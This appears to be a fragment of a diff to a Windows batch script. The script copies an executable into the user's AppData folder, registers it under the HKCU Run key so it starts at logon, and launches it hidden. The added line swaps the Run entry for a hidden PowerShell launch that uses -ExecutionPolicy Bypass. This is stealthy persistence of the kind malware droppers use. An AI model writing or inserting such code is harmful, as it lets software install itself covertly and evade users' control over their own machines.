@@ -19,5 +19,6 @@ if not exist "%APPDATA%\%FOLDER%\%TARGET_EXE%" (
 )
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" >nul 2>&1 || (
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" /t REG_SZ /d "cmd.exe /c start \"\" /B \"%APPDATA%\%FOLDER%\%TARGET_BAT%\"" /f >nul 2>&1
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command Start-Process -WindowStyle Hidden '%APPDATA%\%FOLDER%\%TARGET_BAT%'" /f >nul 2>&1
 )
-powershell -WindowStyle Hidden -Command "Start-Process '%APPDATA%\%FOLDER%\%TARGET_EXE%' -WindowStyle Hidden" >nul 2>&1
+start "" "%APPDATA%\%FOLDER%\%TARGET_EXE%"
